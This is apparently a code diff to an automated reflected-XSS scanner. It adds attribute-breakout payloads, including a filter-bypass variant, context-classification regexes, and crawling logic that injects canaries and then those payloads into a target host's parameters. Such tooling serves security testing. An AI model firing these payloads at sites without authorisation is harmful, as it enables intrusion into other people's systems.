@@ -531,6 +531,18 @@ _XSS_HTML_PAYLOADS: list[tuple[str, str]] = [
     ("js_uri", 'javascript:alert(1)'),
 ]
 
+# Attribute-context payloads (canary in href/src/style attribute values).
+# Goal: break out of the attribute to inject event handlers or new tags.
+_XSS_ATTR_PAYLOADS: list[tuple[str, str]] = [
+    ("attr_dquote_event", '"><img src=x onerror=alert(1)>'),
+    ("attr_squote_event", "'><img src=x onerror=alert(1)>"),
+    ("attr_dquote_svg", '"><svg onload=alert(1)>'),
+    ("attr_js_uri", "javascript:alert(1)"),
+    ("attr_dquote_onfocus", '" onfocus=alert(1) autofocus="'),
+    ("attr_squote_onfocus", "' onfocus=alert(1) autofocus='"),
+    ("attr_waf_bypass", '"%3E%3Csvg%20onload=alert(1)%3E'),
+]
+
 # JS-string-context payloads (canary landed inside onclick/script/js: URI).
 # {C} is replaced with a benign identifier so we can detect breakout
 # without actually running dangerous code.
@@ -553,13 +565,25 @@ _JS_CONTEXT_REGEXES = [
     (r"\bhref\s*=\s*'\s*javascript:[^']*{C}[^']*'", "javascript_uri"),
 ]
 
+_ATTR_CONTEXT_REGEXES = [
+    (r"\b(?:href|src|action|formaction|data|poster|srcset)\s*=\s*\"[^\"]*{C}[^\"]*\"", "html_attribute"),
+    (r"\b(?:href|src|action|formaction|data|poster|srcset)\s*=\s*'[^']*{C}[^']*'", "html_attribute"),
+    (r"\bstyle\s*=\s*\"[^\"]*{C}[^\"]*\"", "html_attribute"),
+    (r"\bstyle\s*=\s*'[^']*{C}[^']*'", "html_attribute"),
+    (r"url\s*\([^)]*{C}[^)]*\)", "html_attribute"),
+]
+
 
 def _classify_canary_context(body: str, canary: str) -> str | None:
     """Classify where *canary* landed: 'script_block', 'event_handler_attr',
-    'javascript_uri', 'html_body', or None (safe / not reflected)."""
+    'javascript_uri', 'html_attribute', 'html_body', or None (not reflected)."""
     if canary not in body:
         return None
     for pattern_tpl, ctx_name in _JS_CONTEXT_REGEXES:
+        pattern = pattern_tpl.replace("{C}", _re.escape(canary))
+        if _re.search(pattern, body, _re.IGNORECASE | _re.DOTALL):
+            return ctx_name
+    for pattern_tpl, ctx_name in _ATTR_CONTEXT_REGEXES:
         pattern = pattern_tpl.replace("{C}", _re.escape(canary))
         if _re.search(pattern, body, _re.IGNORECASE | _re.DOTALL):
             return ctx_name
@@ -668,7 +692,13 @@ async def run_reflected_xss_probe(
         base_url = f"https://{host}"
 
         # ── Step 1: Fetch root page + crawled pages, discover params ──
-        discovered: set[str] = set()
+        # Track param → source URLs so we can test canaries against the
+        # page where each param was actually found (not just the root).
+        param_sources: dict[str, set[str]] = {}
+
+        def _record_params(params: set[str], source_url: str):
+            for p in params:
+                param_sources.setdefault(p, set()).add(source_url)
 
         # Root page
         try:
@@ -677,30 +707,54 @@ async def run_reflected_xss_probe(
                 headers=_PROBE_HEADERS,
             )
             page_html = page_resp.text[:500_000]
-            discovered.update(_discover_params_from_html(page_html, base_url))
+            _record_params(_discover_params_from_html(page_html, base_url), base_url)
         except Exception:
             pass
 
         # Crawled pages for this host (from SPA crawler, Burp import, etc.)
-        for curl in _crawled_by_host.get(host, [])[:20]:
+        # Prioritize URLs with query params (most likely to have testable
+        # parameters) and HTML pages over static assets.
+        _static_exts = ('.js', '.css', '.png', '.jpg', '.gif', '.svg', '.woff',
+                        '.woff2', '.ttf', '.ico', '.map', '.xml', '.json')
+        _host_urls = _crawled_by_host.get(host, [])
+        _urls_with_qs = [u for u in _host_urls if '?' in u]
+        _urls_html = [u for u in _host_urls
+                      if '?' not in u
+                      and not any(u.lower().endswith(e) for e in _static_exts)]
+        _urls_other = [u for u in _host_urls
+                       if u not in _urls_with_qs and u not in _urls_html]
+        _prioritized = (_urls_with_qs + _urls_html + _urls_other)
+        _seen_page_urls: set[str] = set()
+        _deduped: list[str] = []
+        for _u in _prioritized:
+            _p = _urlparse(_u)
+            _page_key = f"{_p.scheme}://{_p.netloc}{_p.path or '/'}"
+            if _page_key not in _seen_page_urls:
+                _seen_page_urls.add(_page_key)
+                _deduped.append(_u)
+        for curl in _deduped[:30]:
             try:
-                # Extract params directly from the crawled URL itself
                 parsed = _urlparse(curl)
-                for k in _parse_qs(parsed.query or ""):
-                    discovered.add(k.lower())
+                # Strip query/fragment to get the clean page URL for canary testing
+                page_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
+                # Extract params directly from the crawled URL itself
+                url_params = set(k.lower() for k in _parse_qs(parsed.query or ""))
+                _record_params(url_params, page_url)
                 # Also fetch the page and parse its HTML for more params
                 cresp = await http_client.get(
                     curl, timeout=8.0, follow_redirects=True,
                     headers=_PROBE_HEADERS,
                 )
-                discovered.update(
-                    _discover_params_from_html(cresp.text[:300_000], curl)
-                )
+                html_params = _discover_params_from_html(cresp.text[:300_000], curl)
+                _record_params(html_params, page_url)
             except Exception:
                 continue
 
+        discovered = set(param_sources.keys())
         if not discovered:
             discovered = set(_FALLBACK_PARAMS)
+            for p in discovered:
+                param_sources.setdefault(p, set()).add(base_url)
 
         _progress("active_baseline_step", {
             "host": host, "step": "xss_params_discovered",
@@ -709,28 +763,67 @@ async def run_reflected_xss_probe(
         })
 
         # ── Step 2: Canary injection + context classification ─────
-        reflection_points: list[tuple[str, str, str]] = []
+        # Test each param against every URL where it was discovered.
+        # reflection_points: (param_name, param_template, context, source_base_url)
+        reflection_points: list[tuple[str, str, str, str]] = []
         for param in sorted(discovered):
             if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                 break
             if len(reflection_points) >= 15:
                 break
-            test_url = f"{base_url}?{param}={canary}"
-            try:
-                resp = await http_client.get(
-                    test_url, timeout=10.0, follow_redirects=True,
-                    headers=_PROBE_HEADERS,
-                )
-                ctx = _classify_canary_context(resp.text[:200_000], canary)
-                if ctx:
-                    param_tpl = "?" + param + "={canary}"
-                    reflection_points.append((param, param_tpl, ctx))
-                    _progress("active_baseline_step", {
-                        "host": host, "step": "xss_reflection_found",
-                        "param": param, "context": ctx,
-                    })
-            except Exception:
-                continue
+            test_urls = sorted(param_sources.get(param, {base_url}))
+            _found_reflection = False
+            for test_base in test_urls:
+                sep = "&" if "?" in test_base else "?"
+                test_url = f"{test_base}{sep}{param}={canary}"
+                try:
+                    resp = await http_client.get(
+                        test_url, timeout=10.0, follow_redirects=True,
+                        headers=_PROBE_HEADERS,
+                    )
+                    ctx = _classify_canary_context(resp.text[:200_000], canary)
+                    if ctx:
+                        param_tpl = "?" + param + "={canary}"
+                        reflection_points.append((param, param_tpl, ctx, test_base))
+                        _progress("active_baseline_step", {
+                            "host": host, "step": "xss_reflection_found",
+                            "param": param, "context": ctx,
+                            "source_url": test_base,
+                        })
+                        _found_reflection = True
+                        break
+                except Exception:
+                    continue
+
+            # Cross-endpoint fallback: if param didn't reflect on its source
+            # pages, try other crawled endpoints on the same host (JSON/data
+            # endpoints often reflect query params in their response body).
+            if not _found_reflection:
+                _cross_eps = [u for u in _deduped[:30]
+                              if _urlparse(u).path not in
+                              {_urlparse(t).path for t in test_urls}]
+                for cross_url in _cross_eps[:8]:
+                    cp = _urlparse(cross_url)
+                    cross_base = f"{cp.scheme}://{cp.netloc}{cp.path or '/'}"
+                    sep = "&" if "?" in cross_base else "?"
+                    test_url = f"{cross_base}{sep}{param}={canary}"
+                    try:
+                        resp = await http_client.get(
+                            test_url, timeout=8.0, follow_redirects=True,
+                            headers=_PROBE_HEADERS,
+                        )
+                        ctx = _classify_canary_context(resp.text[:200_000], canary)
+                        if ctx:
+                            param_tpl = "?" + param + "={canary}"
+                            reflection_points.append((param, param_tpl, ctx, cross_base))
+                            _progress("active_baseline_step", {
+                                "host": host, "step": "xss_cross_endpoint_reflection",
+                                "param": param, "context": ctx,
+                                "source_url": cross_base,
+                            })
+                            break
+                    except Exception:
+                        continue
 
         # Also test the path segment as a generic injection point.
         try:
@@ -741,7 +834,7 @@ async def run_reflected_xss_probe(
             )
             path_ctx = _classify_canary_context(path_resp.text[:200_000], canary)
             if path_ctx:
-                reflection_points.append(("path_segment", "/{canary}", path_ctx))
+                reflection_points.append(("path_segment", "/{canary}", path_ctx, base_url))
         except Exception:
             pass
 
@@ -749,19 +842,27 @@ async def run_reflected_xss_probe(
             continue
 
         # ── Step 3: Payload escalation per context ────────────────
-        for param_name, param_tpl, ctx in reflection_points[:10]:
+        for param_name, param_tpl, ctx, source_base in reflection_points[:10]:
             if ctx in ("script_block", "event_handler_attr", "javascript_uri"):
                 payloads = [
                     (lbl, tpl.replace("{C}", "alert(1)"))
                     for lbl, tpl in _XSS_JS_PAYLOADS
                 ]
+            elif ctx == "html_attribute":
+                payloads = list(_XSS_ATTR_PAYLOADS)
             else:
                 payloads = list(_XSS_HTML_PAYLOADS)
 
             for payload_label, payload in payloads:
                 if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
                     break
-                test_url = f"{base_url}{param_tpl.format(canary=payload)}"
+                filled_tpl = param_tpl.format(canary=payload)
+                if filled_tpl.startswith("/"):
+                    test_url = f"{source_base}{filled_tpl}"
+                elif "?" in source_base:
+                    test_url = f"{source_base}&{filled_tpl.lstrip('?')}"
+                else:
+                    test_url = f"{source_base}{filled_tpl}"
                 try:
                     resp = await http_client.get(
                         test_url, timeout=10.0, follow_redirects=True,
